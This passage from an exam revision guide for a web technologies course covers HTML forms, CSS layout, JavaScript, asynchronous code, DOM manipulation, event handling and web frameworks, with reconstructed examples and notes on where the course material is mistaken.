**HTML5 validation attributes** — five: **`required`**, **`min`/`max`**, **`minlength`/`maxlength`**, **`pattern`** (a regular expression). *Reconstruction of the pattern slide, which the deck says "ensures that the input value is a 5-digit number":*

```html
<input type="text" name="zip" pattern="[0-9]{5}" required>
```

**File uploads** use `<input type="file">`, and — the examinable detail — **`enctype="multipart/form-data"` is necessary on the form when handling file uploads on the server**.

**Accessibility considerations** — three named: use `<label>` to associate text labels with form controls; provide alternative text for images used as form buttons; use **`<fieldset>` and `<legend>`** to group related controls.

### Concrete example — GET versus POST

```
GET:  form data is appended to the URL as query parameters.
      Suitable for search forms and simple data retrieval.
      /search?q=web+technologies&page=2

POST: form data is sent in the request body.
      Suitable for sensitive or large amounts of data.
```

### Where people go wrong

- **"POST sends data securely."** The deck says this of a username/password form. It is false (Part 3). POST keeps data out of the URL bar, history and logs; only HTTPS makes it secure. Say both.
- **`<u>` "underlines text for visual emphasis."** That is the deck's answer and what you should write. In current HTML `<u>` means "unarticulated non-textual annotation" and using it for emphasis is discouraged because underlines read as links. Working practice and exam answer diverge; take the marks.
- Forgetting `enctype="multipart/form-data"`. One named detail on one slide — exactly the kind of thing that becomes a one-mark question.
- Confusing `name` and `id`. **`name` is submitted to the server; `id` identifies the element in the page** (for `<label for>` and JavaScript). The deck states both roles.
- Treating HTML5 validation as security. It is convenience; anyone can bypass it. The server must revalidate (Weeks 6 and 11).

### In the exam

Near-certain: "Describe the key components and structure of an HTML document" (the four); "Create a hyperlink to https://www.mivastudents.com with appropriate anchor text" — the mid-lesson answer is `<a href="https://www.mivastudents.com">Open Miva Students Page</a>`; "Identify three HTML elements used for text formatting" (`<strong>`, `<em>`, `<u>` with purposes); "Differentiate between GET and POST"; "State four accessibility considerations for web forms".

Memorise: **HTML = HyperText Markup Language**; the four document components; **six** heading levels; `href`, `src`, `alt`, `action`, `method`, `enctype="multipart/form-data"`; the eight hyperlink best practices.

---

## Part 10 — CSS: selectors, the box model, layout and typography (Week 4)

*As with Week 3, every CSS rule in the deck was an image. Only exam-bearing reconstructions appear below.*

### What it is, in the slides' terms

"Cascading Style Sheets (CSS) is a **styling language** used to control the **presentation and layout** of HTML documents. CSS **separates the content (HTML) from its presentation (styling)**." Write that separation sentence first in any CSS answer.

### Selectors

"Selectors are **patterns** used to select and target HTML elements to apply styling rules." Five named, examinable in this order:

| Selector | Targets | Deck's example |
|---|---|---|
| **Type** | Elements by HTML tag name | `p { color: blue; }` |
| **Class** | Elements with a specific class value | `.button { background-color: #FF5733; }` |
| **ID** | A **single** element with a **unique** ID value | `#header { font-size: 24px; }` |
| **Universal** | All elements (`*`); "usage should be limited" | `* { margin: 0; padding: 0; }` |
| **Descendant** | Elements descended from a specified element | `article p { font-weight: bold; }` |

*(A stray "40" at the end of the descendant-selector slide is a page number that leaked into the extracted body text, not part of the CSS.)*

### Properties

Five families: **colour** (`color`, `background-color`, `border-color`); **typography** (`font-family`, `font-size`, `font-weight`); **layout** (`width`/`height`, `margin`/`padding`, `display`); **positioning** (`position`, `top`, `right`, `bottom`, `left`); **background** (`background-image`, `background-repeat`, `background-size`).

**Best practices** — four named: meaningful class and ID names; group related properties together; prioritise **external CSS files** for consistency across a site; test in different browsers for **cross-browser compatibility**.

### The CSS box model

"The CSS Box Model is a fundamental concept that defines how elements on a web page are structured and how they interact with each other. It consists of **four essential components**: **content, padding, border and margin**." Learn them inside-out, in that order.

```
+-----------------------------------------------------+
|                     MARGIN                          |
|   +---------------------------------------------+   |
|   |                  BORDER                     |   |
|   |   +-------------------------------------+   |   |
|   |   |             PADDING                 |   |   |
|   |   |   +-----------------------------+   |   |   |
|   |   |   |    CONTENT (width x height) |   |   |   |
|   |   |   +-----------------------------+   |   |   |
|   |   +-------------------------------------+   |   |
|   +---------------------------------------------+   |
+-----------------------------------------------------+
```

- **Content** — "the innermost part, which holds the actual content"; sized by `width` and `height`.
- **Padding** — "the space between the content and the element's border".
- **Border** — "surrounds the padding and content areas and provides a visual boundary".
- **Margin** — "the spaces outside the element's border, creating gaps between elements".

### Concrete example — the box model calculation

A numerical box-model question is very likely. *Reconstruction of the CSS the deck refers to, recoverable from the arithmetic on the following slide: `width: 200px; height: 100px; padding: 20px; border: 2px solid; margin: 10px;`.* The deck's own working:

```
Width  = 200px (content)
       +  40px (left + right padding)
       +   4px (left + right border)
       +  20px (left + right margin)
       = 264px

Height = 100px (content) + 40px + 4px + 20px = 164px
```

### Display, float, Grid and Flexbox

**`display`** — three values named: **`block`** (occupies the full width of the parent, starts on a new line; `<div>`, `<p>`, `<h1>`), **`inline`** (takes only the width needed, no new line; `<span>`, `<a>`, `<strong>`), **`inline-block`** (inline but can have width and height set).

**`float`** — "makes elements float to the left or right within their containing element", for multi-column layouts.

**CSS Grid Layout** — "a **two-dimensional** grid system enabling precise control over rows and columns"; the deck's example is three equal columns with a 20px gap.

**Flexbox** gets a second, fuller treatment, so it is the layout model most likely to be examined in depth. "Flexbox (short for **Flexible Box Layout**)... allows you to distribute space and align elements in a container **even when their sizes are unknown or dynamic**."

Six terms, all examinable: **flex container** (contains flex items; defines the main and cross axes); **flex item**; **main axis** ("by default it runs **horizontally from left to right**"); **cross axis** ("perpendicular... **vertically from top to bottom** by default"); **flex direction**; **justify content** (distribution **along the main axis**); **align items / align self** (alignment **along the cross axis**).

Value lists — memorise all four:

- **`flex-direction`**: `row` (default), `row-reverse`, `column`, `column-reverse`.
- **`justify-content`**: `flex-start`, `flex-end`, `center`, `space-between` (space *between* items), `space-around` (space *around* them), `space-evenly` (equal space around them).
- **`align-items`**: `flex-start` (top), `flex-end` (bottom), `center`, `baseline`, **`stretch` (the default)**.
- **`flex-wrap`**: `nowrap` (default), `wrap`, `wrap-reverse`.

**`align-self`** overrides `align-items` for one item. **Flex properties**: **`flex-grow`** (how much an item grows when there is extra space), **`flex-shrink`** (how much it shrinks when there is not enough), **`flex-basis`** (initial size before extra space is distributed) — "often combined into the shorthand `flex` property, which accepts values for **flex-grow, flex-shrink, and flex-basis in that order**". **Nested flex containers** are allowed: each behaves as a flex item of its parent.

### Text styling and typography

Four terms defined: **font** ("a set of characters with a specific style and design"); **typography** ("the art and technique of arranging and styling text for improved readability and visual impact"); **text styling** ("formatting text elements, including setting colours, backgrounds, text shadows"); **responsive typography** ("adjusting font sizes and layouts so text remains readable on different devices").

Properties named: `font-family` (allows a **prioritised list** of fallbacks), `font-size` (px, em, %), `font-weight` (`normal`, `bold`, or **100 thin to 900 bold**), `color`, `text-decoration`, `text-align` (`left`, `center`, `right`, `justify`), `line-height`, `letter-spacing`, `text-shadow`, `text-transform` (`uppercase`, `lowercase`, `capitalize`).

**Responsive typography** — three named techniques: **fluid typography** (relative units like `vw` or `em`), **media queries**, **relative units** (`em` and `rem` based on the parent's font size).

### Where people go wrong

- **The box model total.** The deck says the total width and height are content + padding + border **+ margin**. In CSS's own terms the *element's* box is content + padding + border; margin is space *outside* it. What the deck computes is the total space the element **occupies in the layout**, which does include margin. **The arithmetic is right and the exam wants 264px.** Give the number, and if asked to explain, write "the total space occupied by the element" rather than "the width of the element" — that satisfies both.
- **`box-sizing` appears nowhere in the course.** In real work `box-sizing: border-box` makes `width: 200px` *include* padding and border, giving a different answer. Leave it out; the course assumes the default `content-box`.
- **`align-items` defaults to `stretch`**, not `flex-start`. Students always get this wrong.
- Reversing justify and align. **Justify = main axis. Align = cross axis.** With `flex-direction: row` justify is horizontal; that flips with `column`.
- The `flex` shorthand order is **grow, shrink, basis**.
- Grid is **two-dimensional**; the deck says so only of Grid, which is the discriminator against Flexbox.

### In the exam

Very likely: "Write a CSS rule using a class selector to change the background colour of all buttons to green, assuming the class name is btn-green" — the mid-lesson question; answer `.btn-green { background-color: green; }`. Very likely: "What is the CSS Box Model and how does it impact layout?" — the four components with a role each, then the arithmetic. Likely: "List five types of CSS selector with an example"; "Explain the main axis and cross axis"; "State four values of `justify-content`".

Memorise: **CSS = Cascading Style Sheets**; the five selectors; the four box-model components in order; `flex-direction`'s four values; `justify-content`'s six; `align-items`'s five with **stretch as default**; **flex: grow shrink basis**.
---

## Part 11 — JavaScript fundamentals (Week 5)

*Every snippet in the Week 5 deck was an image and extracted as nothing: the deck is a sequence of one-line descriptions each followed by a missing example. Since you write JavaScript professionally, the basic syntax is not reproduced here — only the definitions, lists and named examples the exam will ask for.*

### What it is, in the slides' terms

"JavaScript, often abbreviated as JS, is a **high-level, versatile, and dynamic programming language** primarily used for **front-end web development**. It allows us to add interactivity, manipulate the **Document Object Model (DOM)**, and create dynamic content within web browsers."

The comparison the deck insists on: "Unlike HTML and CSS, JavaScript is a **full-fledged programming language**." HTML structures, CSS styles, JavaScript computes — a likely short question.

From the Week 5 Summary (not the deck): JavaScript "was developed by **Brendan Eich**". It is a **client-side scripting language**, distinguished from server-side scripting by "running in the user's browser, as opposed to on the server". Named capabilities: interactivity, enhanced user experience, **real-time form validation**, **event handling**, **data storage**. Named modern applications: **Single-Page Applications (SPAs)**, **Progressive Web Apps (PWAs)**, real-time updates.

### The examinable inventory

**Variables** — three keywords: **`let`**, **`var`**, **`const`**. The deck's rule: "variables declared with `let` can be **reassigned**, while those declared with `const` are **read-only**."

**Data types** — five named: **Number**, **String**, **Boolean**, **Array**, **Object**.

**Comparison operators** — five, each on its own slide, so each is examinable:

| Operator | Name | Checks |
|---|---|---|
| `==` | Equal | Two values are equal |
| `===` | **Strict equal** | Equal **and of the same data type** |
| `!=` | Not equal | Two values are not equal |
| `>` | Greater than | One value greater than another |
| `<` | Less than | One value less than another |

**Arithmetic operators** for basic maths; **logical operators** (`&&`, `||`, `!`) "to combine multiple conditions".

**Control flow** is "the order in which statements are executed... managed through **conditional statements and loops**". Conditionals: `if` / `else if` / `else`, which "can also be **nested**"; the **ternary operator** ("a concise way to write conditional statements with a single expression"); the **switch statement** ("compares a value against multiple possible case values" — **`break`** "exits the switch block once a match is found"). Loops: **`for`** ("used when you know how many times you want to repeat a task" — it initialises a counter, sets a condition and specifies an update), **`while`** ("when the number of iterations is not known in advance"), **`do-while`** ("always executes the block at least once before checking the condition").

**Functions** — three named purposes: **modularity**, **reusability**, **abstraction** ("use code without needing to understand its internal details"). **Parameters** are "placeholders for values a function can receive"; **return values** are "values a function can send back to the code that called it".

**Scope** is "the context in which variables are declared and accessed... it determines the **visibility and lifetime** of variables". Three named: **global** (declared outside any function, accessible anywhere), **local** (inside a function, only within it), **block** ("introduced in modern JavaScript with `let` and `const`", limited to the block).

**Closure** — "a JavaScript feature that allows a function to **maintain access to variables from its containing (enclosing) function, even after the outer function has finished executing**". Used for "**data encapsulation and maintaining state**", and "frequently used in scenarios like **private variables and callbacks**".

**Function expressions** — "functions defined within an expression", assignable to variables or passable as arguments; useful for anonymous functions and callbacks.

**IIFE (Immediately Invoked Function Expression)** — "defined and executed **immediately after its creation**", used "to create a **private scope** for variables and prevent them from polluting the global scope", and for "preventing variable name collisions in large projects".

**Arrow functions** — "**introduced in ES6**"; "a shorter syntax and **automatically bind `this` to the enclosing function's context**, particularly useful in event handlers and callbacks".

**Arrays** — "ordered", each value at a specific **index**; "arrays in JavaScript are **zero-indexed**, meaning the first element is at index 0". Five methods named, one per slide:

| Method | Does |
|---|---|
| `push()` | Adds one or more elements to the **end** |
| `pop()` | Removes the **last** element |
| `splice()` | Adds, removes or replaces elements at a specified index |
| `forEach()` | Executes a provided function once for each element |
| `filter()` | Creates a **new array** with all elements that pass a test |

**Objects** — "collections of **key-value pairs**, where each key is a string (or a symbol) acting as a **property name**". Accessed with dot notation or square brackets. **Object methods** are "functions associated with the object". **Nested arrays** and **nested objects** both appear. **Object constructors** are "functions that define object templates", used to "create multiple instances of objects with similar structures".

**Arrays vs objects** — stated explicitly, so expect it as a question: "**Arrays**: best suited for collections of **similar items**; ordered access; ideal for iterating. **Objects**: suitable for **structured data with key-value pairs**; useful when each piece of data has a **unique identifier (the key)**."

### Concrete example — the two mid-lesson answers

Both are stated with their results in the deck, which makes them prime exam material:

```javascript
function calculateRectangleArea(length, width) {
  return length * width;
}
calculateRectangleArea(8, 4);   // the deck's stated result: 32

for (let i = 1; i <= 10; i++) {
  console.log(i);
}
// the deck's stated result: the last number printed is 10
```

And the closure, because a written definition alone rarely earns full marks:

```javascript
function outer() {
  let outerVar = "I persist";
  function inner() { console.log(outerVar); }
  return inner;
}
const fn = outer();
fn();   // logs "I persist" — outer() has already finished
```

### Where people go wrong

- **`==` vs `===`.** Any question about "strict equal" is asking for the **type** check.
- **`var` vs `let`/`const`.** The course says block scope arrived "with `let` and `const`", so `var` is function-scoped. That is the discriminator.
- **`const` is "read-only", not immutable.** You cannot reassign the variable; you can still mutate the object it holds. Do not claim more than the deck.
- `filter()` returns a **new** array; `push`/`pop`/`splice` mutate the original. The deck says "creates a new array" only of `filter`.
- **An error in the course material:** the Week 5 Summary's "Skills and competencies" block is copy-pasted from Week 4 and lists CSS proficiency, responsive design and brand consistency for a JavaScript lesson. It is not a hint that CSS is on the JavaScript exam.

### In the exam

Near-certain: the rectangle-area function (**32**) and the 1-to-10 loop (**10**). Likely: "Differentiate between arrays and objects"; "Define closure"; "What is an IIFE and why is it used?"; "List three types of variable scope"; "Differentiate between `==` and `===`".

Memorise: **DOM = Document Object Model**; **IIFE = Immediately Invoked Function Expression**; **ES6 = ECMAScript 6 = ECMAScript 2015**; the five comparison operators; the five array methods; global/local/block; **Brendan Eich**.

---

## Part 12 — Advanced JavaScript: async, ES6 and AJAX (Week 6)

*The Week 6 deck also lost all its code to image extraction.*

### Working with forms in JavaScript

Three named access methods: **`getElementById`**, **`getElementsByTagName`**, **`getElementsByClassName`**. "Once we have access to form elements, we can manipulate their properties like **`value`, `type`, and `name`**." The mid-lesson answer gives exact code, so learn it: `document.getElementById("username").value = "newUsername";`

**Client-side form validation** is "essential to ensure users provide valid data before submitting a form... it can **prevent unnecessary server requests** and enhance user experience". Named techniques: required fields, email addresses, password strength.

**Form submission** — "JavaScript allows us to **intercept the form submission process**, validate input, and decide whether to proceed." **Dynamic form manipulation** — adding or removing elements based on user actions. **Form events** — four named: **submit**, **reset**, **change**, **focus**.

**Security considerations** — two named vulnerabilities, **XSS (Cross-Site Scripting)** and **CSRF (Cross-Site Request Forgery)**; three named measures: input sanitisation, validation, implementing security measures.

### Asynchronous programming

"Asynchronous programming... allows us to **execute tasks without blocking the main thread**." Asynchronicity is "the ability to execute tasks **independently, without waiting for other tasks to complete**".

Three mechanisms in the deck's order — that order is the answer to "describe the approaches to asynchronous programming in JavaScript":

1. **Callbacks** — "functions passed as arguments to other functions and executed **after a particular task is completed**. A fundamental way of handling asynchronous operations."
2. **Promises** — "a more structured way... they represent a value that **may not be available yet but will be at some point in the future, either successfully or with an error**."
3. **Async/await** — "a more modern and concise way... it allows us to write asynchronous operations in a **more synchronous and readable** manner."

**The event loop** — "a fundamental part of JavaScript's **concurrency model**. It continuously checks the **message queue** for tasks to execute."

**Real-world applications** — four named: fetching and displaying data from APIs; handling user input without blocking the UI; running animations and transitions; background tasks like data synchronisation.

**Best practices** — four named: use promises or async/await for cleaner code; handle errors with **`.catch()`** or **`try...catch`**; avoid nested callbacks by using named functions or promises; be mindful of the event loop and avoid long-running synchronous tasks.

### ES6 and modern JavaScript

"**ES6**, also known as **ECMAScript 2015**, is the **sixth major version** of the ECMAScript language specification." Both names and "sixth" are examinable.

Seven features named, one per slide:

| Feature | The deck's description |
|---|---|
| **`let` and `const`** | Block-scoped declarations; better scoping than `var` |
| **Arrow functions** | Concise anonymous functions; **lexical scoping for `this`** |
| **Template literals** | Multi-line strings; embedded expressions using **`${}`** |
| **Destructuring** | Concise extraction of values from arrays and objects |
| **Spread and rest (`...`)** | Copy arrays/objects; gather function arguments into arrays |
| **Classes** | Class syntax for creating objects and prototypes |
| **Modules** | Separate files with **`import` and `export`** |

Three further named topics: **modular development** ("smaller, reusable modules helps maintainability and encourages **separation of concerns**"); **functional programming** (**immutability** and **pure functions** "promote clean and predictable code"); **transpilation** ("modern JavaScript is often transpiled using tools like **Babel**" for older-browser compatibility).

### AJAX

**AJAX = Asynchronous JavaScript and XML.** It sends form data to the server "**without refreshing the entire page**". Two mechanisms named: the **`XMLHttpRequest` object** ("the traditional way") and the **Fetch API** ("a modern alternative... **it returns promises** for a more concise and readable syntax").

**JSON (JavaScript Object Notation)** is "a common data format used for data exchange in AJAX requests".

**Cross-origin requests** — "AJAX requests are subject to the **same-origin policy**, which restricts requests to the same domain. To make requests to different domains, we will need to handle **Cross-Origin Resource Sharing (CORS)** or use server-side proxies."

**Real-world applications of AJAX** — three named: **SPAs** ("load content dynamically and update the URL without full page reloads"), **form validation**, **real-time updates** (chat messages, live scores).

### Concrete example — the same operation three ways

*Reconstruction. The deck describes callbacks, promises and async/await and shows code for none of them. Side by side is the fastest route to a "compare" answer:*

```javascript
// 1. CALLBACK
getUser(123, function (err, user) {
  if (err) { console.error(err); return; }
  console.log(user.name);
});

// 2. PROMISE
fetch("/api/users/123")
  .then(response => response.json())
  .then(user => console.log(user.name))
  .catch(error => console.error(error));

// 3. ASYNC/AWAIT — the same promise, written to read synchronously
async function showUser() {
  try {
    const response = await fetch("/api/users/123");
    const user = await response.json();
    console.log(user.name);
  } catch (error) {
    console.error(error);
  }
}
```

The "nested callbacks" problem the deck warns about is what happens when step 2 depends on step 1 and step 3 on step 2: each callback nests inside the last. Promises and async/await flatten it.

### Where people go wrong

- **AJAX has "XML" in the name but almost always carries JSON.** Expand it correctly — **Asynchronous JavaScript and XML** — then note that JSON is the common format, which is what the deck itself says two slides later.
- **The mid-lesson answer claims client-side validation "can check if a user's chosen username is already taken without waiting for the server's response".** That is **wrong, and it is the course's own error** — uniqueness is information only the server has. If this exact scenario appears, describe client-side validation as checking *format, presence and length* instantly, and note that uniqueness requires a server round trip (usually asynchronous, which is why it feels instant).
- Client-side validation is **not** a security control. It improves UX and reduces server load; the server must revalidate.
- Confusing the **same-origin policy** (the restriction) with **CORS** (the mechanism that relaxes it).
- Saying async/await "replaces" promises. It is syntax **on top of** promises.

### In the exam

Likely, straight from the learning objective: "Explain the concepts of asynchronous programming in JavaScript, including callbacks, promises and async/await." Also: "What is AJAX and how does it improve user experience?"; "List five features introduced in ES6"; "How would you change the value of a text input with the ID 'username'?"

Memorise: **AJAX = Asynchronous JavaScript and XML**; **JSON = JavaScript Object Notation**; **CORS = Cross-Origin Resource Sharing**; **XSS = Cross-Site Scripting**; **CSRF = Cross-Site Request Forgery**; **SPA = Single Page Application**; **ES6 = ECMAScript 2015**; **Babel**.

---

## Part 13 — Events and event handling (Week 6 syllabus topic)

*This material appears **only on the Week 6 Summary sheet**, not in the Week 6 deck, which covers async and ES6 instead. The whole of it is one paragraph — but it is the named topic of the week, so it is prime exam material. Everything past that paragraph is not from the course deck.*

### What it is, in the slides' terms

"Events are **actions or occurrences that happen in a web page**, such as clicking a button, scrolling, or submitting a form. They trigger a response from the web page, such as displaying content, updating data, or redirecting to a new page."

**Event handling** is "the process of **capturing, processing, and responding to events**. When an event occurs, it is first captured by the event listener, which then processes it and triggers a response."

### The four components of an event

The single most quotable list in Week 6:

| Component | Definition from the sheet |
|---|---|
| **Event source** | The element that triggers the event |
| **Event type** | The specific type of event that occurs |
| **Event listener** | The function that is called when the event occurs |
| **Event object** | Contains information about the event |

Three named reasons events matter: **user interaction**, **dynamic content**, **user feedback** — "they allow web pages to respond to user actions in real time". **Event propagation** is "the process by which events are passed through **multiple nested elements**".

### How it works — not from the course deck

Propagation has **three phases**, in order: **capturing** (from `window` down through the ancestors to the target), **target** (the element actually interacted with), **bubbling** (back up from the target to `window`). `addEventListener` listens in the **bubbling** phase by default; passing `true` as the third argument listens while capturing. `stopPropagation()` halts the journey; `preventDefault()` cancels the browser's default action without stopping propagation. **Event delegation** follows from bubbling: one listener on a parent can handle events from any number of children, including ones added later.

### Concrete example

The sheet's own scenario — "when a user clicks a button, an event listener is triggered, which then calls a function to display a message" — labelled with the four components:

```javascript
const button = document.getElementById("my-button");   // EVENT SOURCE

button.addEventListener("click", function (event) {    // EVENT TYPE: "click"
                                                       // EVENT LISTENER: this function
  document.getElementById("message").textContent =
    "Clicked at x=" + event.clientX;                   // EVENT OBJECT: "event"
});
```

Propagation, with the two listeners nested:

```javascript
outer.addEventListener("click", () => console.log("outer"));
inner.addEventListener("click", () => console.log("inner"));
// Clicking the inner button logs:  inner  then  outer
```

### Where people go wrong

- Naming only three components. There are **four**; the **event object** is the one students forget.
- Confusing `stopPropagation()` with `preventDefault()`. One stops the event travelling; the other stops the browser's built-in reaction.
- Reversing propagation order: capturing goes **down**, bubbling goes **up**, and bubbling is the default.
- In React you write `onClick={...}` and never think about phases. The exam wants the four components and the phrase "event propagation".

### In the exam

Very likely, because the sheet asks it in its own questions to ponder: "What are the key components of events and event handling?" — the four-component table. Also: "Explain event propagation"; "Describe, with an example, how a button click event is handled."

Memorise: **event source, event type, event listener, event object**; **capturing → target → bubbling**; **`addEventListener`**.

---

## Part 14 — The Document Object Model (Week 7)

*All Week 7 code examples were images. Only exam-bearing reconstructions below.*

### What it is, in the slides' terms

"The Document Object Model (DOM) is a **programming interface** that represents web documents (**HTML, XHTML, or XML**) as a **tree-like structure called the DOM tree**." Note that it covers XML too — the Week 7 Summary makes the point that "HTML is used for web content, while XML is used for data structuring", and the DOM serves both.

### Elements versus nodes

The deck separates these deliberately, and the distinction is examinable.

**DOM Elements** are "the individual components of a web page that can be manipulated through scripting languages like JavaScript. They **represent the HTML tags**." Three examples given: `<div>` (a container grouping and styling content), `<button>` (user interaction), `<a>` (hyperlinks, essential for navigation).

**DOM Nodes** are "individual entities within the DOM tree, **including elements, attributes, and text content**... organised **hierarchically**." Three node types — the list the learning objective explicitly asks you to distinguish:

| Node type | What it is | Deck's example |
|---|---|---|
| **Element node** | An HTML tag | `<div>`, `<button>`, `<a>` |
| **Attribute node** | An HTML attribute | In `<img src alt>`, **both `src` and `alt`** |
| **Text node** | Text content inside an element | "Hello, World!" inside `<p>` |

So **every element is a node, but not every node is an element** — that sentence answers the likeliest trick question here.

### The hierarchical structure

"Each element node can have **child nodes, sibling nodes, and parent nodes**." The deck's own example: a `<div id="parentDiv">` containing two `<p>` elements. The `<div>` is the **parent**; the two `<p>` are **children** and **siblings** of each other; the text inside each `<p>` is a **text node**.

```
div#parentDiv                    (element node, parent)
   +-- id="parentDiv"            (attribute node)
   +-- p                         (element node, child; sibling of next p)
   |     +-- "Child Paragraph 1" (text node)
   +-- p                         (element node, child)
         +-- "Child Paragraph 2" (text node)
```

### Accessing and manipulating the DOM

"The starting point for interacting with the DOM is the **`document` object**. It represents the entire web page."

**Selecting elements** — five methods; memorise the list exactly:

| Method | Selects |
|---|---|
| `getElementById()` | An element by its **unique ID** |
| `getElementsByClassName()` | Elements by their **class name** |
| `getElementsByTagName()` | Elements by their **tag name** |
| `querySelector()` | The **first** matching element, using **CSS selectors** |
| `querySelectorAll()` | **All** matching elements, using **CSS selectors** |

**Changing content**: **`textContent`** ("the primary property for text content manipulation") and **`innerHTML`** ("**be cautious when using innerHTML to prevent potential security vulnerabilities**").

**Adding and removing elements**: **`createElement()`**, **`appendChild()`**, **`removeChild()`**.

**Attributes**: change values, add and remove them. **Dataset attributes** — "custom data attributes (**prefixed with `data-`**) are commonly used to store additional information about elements".

### Concrete example — the deck's two worked walkthroughs

Both are stated as ordered lists in the deck's own answers, so reproduce them as ordered lists.

**Validating an email field:** (1) access the input using DOM methods like `getElementById`; (2) attach an event listener that triggers when the user types or blurs the field; (3) retrieve the input value inside the listener; (4) use a **regular expression** to validate the format — the deck gives **`/\S+@\S+\.\S+/`**; (5) provide feedback, such as changing the border colour or displaying an error message.

**An image gallery with captions:** (1) select all images with `querySelectorAll`; (2) add a click listener to each; (3) extract the **`alt` attribute**, which contains the caption text; (4) display it in a designated area such as a `<div>`, updating its text content when a different image is clicked.

```javascript
const caption = document.getElementById("caption");
document.querySelectorAll(".gallery img").forEach(function (img) {
  img.addEventListener("click", function () {
    caption.textContent = this.alt;
  });
});
```

The deck also names two projects without showing code: a **to-do list** ("HTML for the structure and JavaScript for dynamic functionality like adding and removing tasks") and an **image carousel** ("navigation buttons to move between images").

### Where people go wrong

- `getElementById` takes a bare id (`"myButton"`); `querySelector` takes a CSS selector (`"#myButton"`). Writing `getElementById("#myButton")` returns null and is a common slip.
- **`innerHTML` and security.** The deck flags it twice but never says why. The reason: assigning user-supplied text to `innerHTML` executes markup in it, which is an **XSS** vector; `textContent` does not. Saying that connects Week 7 to Week 11 and marks well.
- Claiming attributes are not nodes. The deck is explicit: `src` and `alt` are **attribute nodes**.
- Modern practice is `querySelector`/`querySelectorAll` for everything, and framework code touches the DOM rarely. The exam wants all five methods named.

### In the exam

Very likely: "List five methods used to select elements in the DOM"; "Distinguish between element nodes, attribute nodes and text nodes, with examples"; the two mid-lesson walkthroughs as ordered lists; "Differentiate between `textContent` and `innerHTML`, stating a security consideration."

Memorise: **DOM = Document Object Model**; **DOM tree**; the three node types; the five selection methods; `createElement`, `appendChild`, `removeChild`; `textContent` vs `innerHTML`; the **`data-`** prefix; the regex **`/\S+@\S+\.\S+/`**.
---

## Part 15 — Libraries and frameworks (Week 8)

### What it is, in the slides' terms

**JavaScript libraries** are "**pre-written collections of functions and code snippets** that can be seamlessly integrated into your web projects".

The Week 8 Summary gives the discriminator, and it is the likeliest single question here: "**Libraries** consist of pre-written code for **specific tasks**, while **frameworks** dictate the **overall application structure**." Put differently: you call a library; a framework calls you.

### The three libraries

**jQuery** — "a **fast, small, and feature-rich** JavaScript library that simplifies **HTML document traversing, event handling, animating, and Ajax interactions** for rapid web development." Five features, on five slides, repeated in the mid-lesson answer, so this list is near-guaranteed:

1. **DOM manipulation** — select elements, modify properties, add new elements.
2. **Event handling** — concise methods to attach event listeners.
3. **AJAX requests** — fetch data without reloading the page.
4. **Animation** — simple animations to enhance user experience.
5. **Cross-browser compatibility** — "abstracts away many cross-browser inconsistencies".

**Lodash** — "a modern JavaScript **utility library**... for **arrays, objects, strings**, and more. It emphasises **performance and functional programming principles**." Three features: **utility functions**, **chaining** ("build complex operations by chaining multiple functions together"), **performance optimisation** ("suitable for processing large datasets efficiently").

**Moment.js** — "a library for **parsing, formatting, and manipulating dates and times**". Four features: **date parsing and formatting**, **date arithmetic**, **timezone support** (including daylight saving), **locale support** (for internationalisation).

**When to use which library** — five named factors: **project requirements**, **library size** (impact on page load times), **modern JavaScript** ("modern language features and APIs have made some aspects of these libraries less essential"), **development team familiarity**, **maintenance and longevity**.

### The three frontend frameworks

| | React | Angular | Vue.js |
|---|---|---|---|
| Made by | Facebook | Google | (not stated) |
| Described as | "a popular JavaScript **library** for building user interfaces" | "a comprehensive frontend **framework**" | "a **progressive** framework focused on the **view layer**" |
| Key concepts | Component-based architecture; **virtual DOM**; **unidirectional data flow** | Modules and components; **dependency injection**; **two-way data binding** | **Directives**; component system; **incrementally adoptable** |

**React**: **components** are "reusable building blocks that encapsulate a part of the user interface and its behaviour"; the **virtual DOM** means "instead of directly manipulating the DOM, React tracks the **difference** between the virtual DOM and the actual DOM and updates **only the necessary parts**"; **unidirectional data flow** means "data flows from **parent components to child components**... helps maintain predictable state and simplifies debugging".

**Angular**: **modules** are "containers for components, services, and other application parts"; **dependency injection** "manages the creation and sharing of application services... promotes modularity and testability"; **two-way data binding** gives "automatic synchronisation of data between the UI and the data model — changes in one affects the other".

**Vue.js**: **directives** are "added to HTML elements to declaratively render dynamic content and manage the DOM"; components are "self-contained units with their templates, scripts, and styles"; the defining property is being "**incrementally adoptable** — we can use as much or as little of it as needed".

**Choosing a frontend framework** — five factors: **project requirements**, **team familiarity**, **community and ecosystem**, **scalability** ("Angular is known for its scalability and is often chosen for enterprise-level applications"), **learning curve** ("Vue.js is often praised for its gentle learning curve, while React and Angular may have steeper initial learning curves").

### The four backend frameworks

| Framework | Language | Named principles and features |
|---|---|---|
| **Django** | Python | **MVC** architecture; **DRY**; admin interface; built-in authentication and authorisation |
| **Express.js** | JavaScript (Node.js) | **Minimalist and flexible**; **middleware**; routing; template engines; request and response objects |
| **Ruby on Rails** | Ruby | **CoC**; **DRY**; **Active Record** (ORM); **RESTful routing**; **scaffolding** |
| **ASP.NET** | C# | ASP.NET Core (cross-platform); **MVC**; **Razor Pages**; Visual Studio integration |

**Django** — "a **high-level Python web framework** that encourages rapid development and clean, pragmatic design", following **MVC** and the **DRY ("Don't Repeat Yourself")** principle. Its MVC mapping is stated explicitly: "**models** define the data structure, **views** handle presentation logic, and **URL dispatchers (controllers)** manage routing and request handling." The **admin interface** "generates a customisable admin panel... particularly useful for content management systems (CMS)".

**Express.js** — "minimalist and flexible... simplifies the creation of APIs and handling of HTTP requests". **Middleware** is the concept the deck examines directly, and the mid-lesson answer is the definition to memorise: "**functions that have access to the request and response objects in the application's request-response cycle. Middleware functions can perform tasks like authentication, logging, and data parsing.**" They are "**executed in the order they are defined**". Also named: routing (including "dynamic routing based on URL parameters"), **template engines** (EJS, Handlebars), and the request and response objects.

**Rails** — **Convention over Configuration (CoC)** means "sensible defaults and conventions... minimises configuration". **Active Record** "provides an **Object-Relational Mapping (ORM)** layer for database interaction. Models in Rails directly map to database tables." **RESTful routing** and **scaffolding** ("automates the creation of common components like models, controllers, and views").

**ASP.NET** — "developed by **Microsoft**". **ASP.NET Core** is "the latest version, known for its **cross-platform compatibility** — Windows, Linux and macOS". **Razor Pages** is "an alternative architectural pattern... with a focus on simplicity. It reduces the complications associated with traditional MVC."

**Choosing a backend framework** — five factors: **project requirements**, **language preference**, **community and ecosystem**, **performance and scalability**, **development team expertise**.

### Concrete example — Express middleware

*Reconstruction. The deck defines middleware and asks about it, but shows no code. This is the shape an exam answer's example should take:*

```javascript
const app = require("express")();

